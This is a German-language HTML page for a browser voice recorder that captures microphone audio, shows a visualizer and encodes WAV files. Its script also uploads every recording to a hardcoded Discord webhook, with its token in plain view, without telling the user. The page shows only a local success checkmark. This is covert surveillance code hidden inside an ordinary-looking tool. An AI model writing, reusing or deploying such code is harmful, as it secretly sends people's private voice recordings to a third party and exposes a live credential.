<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>audio</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Inter', system-ui, -apple-system, sans-serif;
    min-height: 100vh; background: #0a0f1a;
    display: flex; justify-content: center; align-items: flex-start;
    padding: 24px; overflow-y: auto;
  }
  .bg-glow {
    position: fixed; inset: 0; z-index: 0; pointer-events: none;
    background: radial-gradient(ellipse at 20% 30%, rgba(99,102,241,0.07) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 70%, rgba(236,72,153,0.05) 0%, transparent 60%);
  }
  .container { position: relative; z-index: 1; text-align: center; max-width: 520px; width: 100%; padding: 32px 20px; }
  h1 { color: #fff; font-weight: 200; font-size: 2.4rem; letter-spacing: 1px; margin-bottom: 4px; }
  h1 span { background: linear-gradient(135deg, #818cf8, #f472b6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
  .sub { color: rgba(255,255,255,0.2); font-size: 0.85rem; font-weight: 300; letter-spacing: 2px; margin-bottom: 24px; }
  .visualizer {
    width: 100%; height: 120px; border-radius: 16px;
    background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.06);
    margin-bottom: 20px; overflow: hidden;
  }
  .visualizer canvas { width: 100%; height: 100%; display: block; }
  .record-btn {
    width: 80px; height: 80px; border-radius: 50%;
    border: 3px solid rgba(239,68,68,0.5); background: rgba(239,68,68,0.1);
    color: rgba(239,68,68,0.7); font-size: 2rem; cursor: pointer;
    transition: all 0.3s; margin: 0 auto 20px; display: flex;
    align-items: center; justify-content: center; user-select: none;
  }
  .record-btn:hover { border-color: rgba(239,68,68,0.7); background: rgba(239,68,68,0.15); }
  .record-btn.recording { border-color: rgba(239,68,68,0.3); background: rgba(239,68,68,0.15); animation: pulse 1s ease infinite; }
  @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(239,68,68,0.2); } 50% { box-shadow: 0 0 0 16px rgba(239,68,68,0); } 100% { box-shadow: 0 0 0 0 rgba(239,68,68,0); } }
  .timer { color: rgba(255,255,255,0.25); font-size: 2rem; font-weight: 200; letter-spacing: 2px; margin-bottom: 20px; font-variant-numeric: tabular-nums; }
  .recordings { margin-top: 20px; display: none; }
  .recordings.show { display: block; }
  .rec-item {
    display: flex; align-items: center; gap: 12px;
    background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.06);
    border-radius: 12px; padding: 10px 14px; margin-bottom: 8px;
    animation: fadeIn 0.3s ease;
  }
  @keyframes fadeIn { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
  .rec-item .dur { color: rgba(255,255,255,0.3); font-size: 0.75rem; flex-shrink: 0; min-width: 50px; }
  .rec-item audio { height: 32px; flex: 1; min-width: 0; opacity: 0.6; }
  .rec-item .time { color: rgba(255,255,255,0.15); font-size: 0.6rem; flex-shrink: 0; }
  .rec-item .status { color: rgba(16,185,129,0.5); font-size: 0.65rem; flex-shrink: 0; }
  .nav-links { margin-top: 32px; display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
  .nav-links a { color: rgba(255,255,255,0.15); text-decoration: none; font-size: 0.65rem; letter-spacing: 1px; padding: 6px 14px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.05); transition: all 0.25s; }
  .nav-links a:hover { color: rgba(255,255,255,0.4); border-color: rgba(255,255,255,0.1); background: rgba(255,255,255,0.02); }
</style>
</head>
<body>
<div class="bg-glow"></div>
<div class="container">
  <h1><span>audio</span> 🎙️</h1>
  <div class="sub">sprachaufnahme · wav</div>
  <div class="visualizer"><canvas id="visualizer"></canvas></div>
  <div class="timer" id="timer">00:00</div>
  <div class="record-btn" id="recordBtn">🎤</div>
  <div class="recordings" id="recordings"></div>
  <div class="nav-links">
    <a href="camera.html">📸 filterit</a>
    <a href="index.html">📸 repo</a>
    <a href="convert.html">🔄 bildwerk</a>
    <a href="metadata.html">🔍 metadaten</a>
    <a href="ascii.html">🎨 ascii</a>
    <a href="filedrop.html">📁 filedrop</a>
    <a href="video.html">📹 video</a>
    <a href="pastebin.html">📝 pastebin</a>
    <a href="qr.html">📱 qr</a>
  </div>
</div>

<script>
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510937957178015856/opLl-cQv-svjPmOXHmRx3Xqyn78E8EzkISiolgjrTXDrVQ33Ugwgke9bBzBjp0HH2UK2';
const recordBtn = document.getElementById('recordBtn');
const timerEl = document.getElementById('timer');
const recordings = document.getElementById('recordings');
const canvas = document.getElementById('visualizer');
const ctx = canvas.getContext('2d');

let recording = false;
let startTime = 0;
let timerInterval = null;
let animRaf = null;
let stream = null;
let audioCtx = null;
let source = null;
let processor = null;
let analyser = null;
let dataArray = null;
let pcmBuffers = [];
let sampleRate = 48000;

function resizeCanvas() { const r = canvas.parentElement.getBoundingClientRect(); canvas.width = r.width * (window.devicePixelRatio || 1); canvas.height = canvas.parentElement.clientHeight * (window.devicePixelRatio || 1); }
resizeCanvas(); window.addEventListener('resize', resizeCanvas);

recordBtn.addEventListener('click', () => {
  if (recording) { stop(); return; }
  start();
});

async function start() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    audioCtx = new AudioContext();
    sampleRate = audioCtx.sampleRate;
    source = audioCtx.createMediaStreamSource(stream);
    analyser = audioCtx.createAnalyser();
    analyser.fftSize = 256;
    dataArray = new Uint8Array(analyser.frequencyBinCount);
    source.connect(analyser);
    processor = audioCtx.createScriptProcessor(4096, 1, 1);
    pcmBuffers = [];
    processor.onaudioprocess = e => {
      const ch = e.inputBuffer.getChannelData(0);
      pcmBuffers.push(new Float32Array(ch));
      analyser.getByteFrequencyData(dataArray);
      const out = e.outputBuffer.getChannelData(0);
      for (let i = 0; i < out.length; i++) out[i] = 0;
    };
    source.connect(processor);
    processor.connect(audioCtx.destination);
    recording = true;
    recordBtn.classList.add('recording');
    recordBtn.textContent = '⏹';
    startTime = Date.now();
    timerInterval = setInterval(() => {
      const s = Math.floor((Date.now() - startTime) / 1000);
      timerEl.textContent = `${String(Math.floor(s / 60)).padStart(2, '0')}:${String(s % 60).padStart(2, '0')}`;
    }, 100);
    drawVisualizer();
  } catch { recordBtn.textContent = '🚫'; setTimeout(() => { recordBtn.textContent = '🎤'; }, 2000); }
}

function stop() {
  if (!recording) return;
  recording = false;
  recordBtn.classList.remove('recording');
  recordBtn.textContent = '🎤';
  clearInterval(timerInterval);
  timerEl.textContent = '00:00';
  cancelAnimationFrame(animRaf);
  animRaf = null;
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  if (processor) { processor.disconnect(); processor = null; }
  if (source) { source.disconnect(); source = null; }
  if (audioCtx) { audioCtx.close(); audioCtx = null; }
  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
  encodeWAV();
}

function drawVisualizer() {
  if (!analyser || !recording) return;
  const w = canvas.width, h = canvas.height;
  ctx.clearRect(0, 0, w, h);
  const barW = (w / dataArray.length) * 2.5;
  for (let i = 0; i < dataArray.length; i++) {
    const x = i * barW;
    const barH = (dataArray[i] / 255) * h;
    const grad = ctx.createLinearGradient(x, h, x, h - barH);
    grad.addColorStop(0, `hsla(${i / dataArray.length * 300 + 200}, 80%, 60%, 0.15)`);
    grad.addColorStop(1, `hsla(${i / dataArray.length * 300 + 200}, 80%, 60%, 0.4)`);
    ctx.fillStyle = grad;
    ctx.fillRect(x, h - barH, Math.max(1, barW - 1), barH);
  }
  animRaf = requestAnimationFrame(drawVisualizer);
}

function encodeWAV() {
  if (pcmBuffers.length === 0) return;
  const sr = sampleRate;
  let totalLen = 0;
  for (const buf of pcmBuffers) totalLen += buf.length;
  const pcm = new Float32Array(totalLen);
  let off = 0;
  for (const buf of pcmBuffers) { pcm.set(buf, off); off += buf.length; }
  const dur = Math.floor(totalLen / sr);
  const numSamples = totalLen;
  const bytesPerSample = 2;
  const numChannels = 1;
  const dataSize = numSamples * bytesPerSample;
  const headerSize = 44;
  const buf = new ArrayBuffer(headerSize + dataSize);
  const dv = new DataView(buf);
  function writeStr(o, s) { for (let i = 0; i < s.length; i++) dv.setUint8(o + i, s.charCodeAt(i)); }
  writeStr(0, 'RIFF');
  dv.setUint32(4, 36 + dataSize, true);
  writeStr(8, 'WAVE');
  writeStr(12, 'fmt ');
  dv.setUint32(16, 16, true);
  dv.setUint16(20, 1, true);
  dv.setUint16(22, numChannels, true);
  dv.setUint32(24, sr, true);
  dv.setUint32(28, sr * numChannels * bytesPerSample, true);
  dv.setUint16(32, numChannels * bytesPerSample, true);
  dv.setUint16(34, bytesPerSample * 8, true);
  writeStr(36, 'data');
  dv.setUint32(40, dataSize, true);
  for (let i = 0; i < numSamples; i++) {
    const s = Math.max(-1, Math.min(1, pcm[i]));
    dv.setInt16(headerSize + i * 2, s < 0 ? s * 0x8000 : s * 0x7FFF, true);
  }
  const blob = new Blob([buf], { type: 'audio/wav' });
  const ts = Date.now();
  const durStr = `${String(Math.floor(dur / 60)).padStart(2, '0')}:${String(dur % 60).padStart(2, '0')}`;
  send(blob, ts, durStr);
}

function send(blob, ts, dur) {
  const fd = new FormData();
  const name = `audio_${ts}.wav`;
  fd.append('file', blob, name);
  fetch(WEBHOOK_URL, { method: 'POST', body: fd });
  recordings.classList.add('show');
  const div = document.createElement('div');
  div.className = 'rec-item';
  const now = new Date(ts).toLocaleTimeString();
  div.innerHTML = `<div class="dur">${dur}</div><audio controls src="${URL.createObjectURL(blob)}"></audio><div class="time">${now}</div><div class="status">✅</div>`;
  recordings.prepend(div);
  while (recordings.children.length > 20) recordings.lastChild.remove();
}
</script>
</body>
</html>
